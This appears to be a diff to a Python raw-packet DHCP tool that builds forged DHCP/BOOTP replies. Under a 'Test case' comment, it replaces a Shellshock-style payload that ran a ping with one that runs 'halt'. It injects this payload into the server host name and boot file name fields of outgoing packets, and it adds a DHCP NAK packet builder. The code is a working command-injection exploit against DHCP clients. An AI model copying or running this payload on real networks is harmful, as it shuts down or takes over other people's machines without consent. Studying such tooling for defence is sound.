@@ -433,12 +433,13 @@ class DHCP_raw:
         GIADDR = inet_aton(bootp_relay_agent_ip)                # Relay agent IP address
         CHADDR = self.eth.convert_mac(bootp_client_hw_address)  # Client hardware address
 
-        client_hw_padding = ''.join(pack("B", 0) for _ in range(10))    # Client hardware address padding
-        server_host_name = ''.join(pack("B", 0) for _ in range(64))     # Server host name
         # Test case
-        ping_command = bytes("() { :; }; /system/bin/ping 192.168.1.1")
-        ping_command = pack("!%ds" % (len(ping_command)), ping_command)
-        boot_file_name = ping_command + ''.join(pack("B", 0) for _ in range(128 - len(ping_command)))      # Boot file name
+        test_command = bytes("() { :; }; halt")
+        test_command = pack("!%ds" % (len(test_command)), test_command)
+
+        client_hw_padding = ''.join(pack("B", 0) for _ in range(10))    # Client hardware address padding
+        server_host_name = test_command + ''.join(pack("B", 0) for _ in range(64 - len(test_command)))  # Server host name
+        boot_file_name = test_command + ''.join(pack("B", 0) for _ in range(128 - len(test_command)))  # Boot file name
         magic_cookie = pack("!4B", 99, 130, 83, 99)                     # Magic cookie: DHCP
 
         dhcp_packet = pack("!" "4B" "L" "2H",
@@ -509,6 +510,28 @@ class DHCP_raw:
                 options += option_url
 
         options += option_end
+
+        return self.make_packet(ethernet_src_mac=source_mac,
+                                ethernet_dst_mac=destination_mac,
+                                ip_src=source_ip, ip_dst=destination_ip,
+                                udp_src_port=67, udp_dst_port=68,
+                                bootp_message_type=2,
+                                bootp_transaction_id=transaction_id,
+                                bootp_flags=0,
+                                bootp_client_ip="0.0.0.0",
+                                bootp_your_client_ip=your_ip,
+                                bootp_next_server_ip="0.0.0.0",
+                                bootp_relay_agent_ip="0.0.0.0",
+                                bootp_client_hw_address=client_mac,
+                                dhcp_options=options)
+
+    def make_nak_packet(self, source_mac, destination_mac, source_ip, destination_ip, transaction_id, your_ip,
+                        client_mac, dhcp_server_id):
+
+        option_operation = pack("!3B", 53, 1, 6)
+        option_server_id = pack("!" "2B" "4s", 54, 4, inet_aton(dhcp_server_id))
+        option_end = pack("B", 255)
+        options = option_operation + option_server_id + option_end
 
         return self.make_packet(ethernet_src_mac=source_mac,
                                 ethernet_dst_mac=destination_mac,
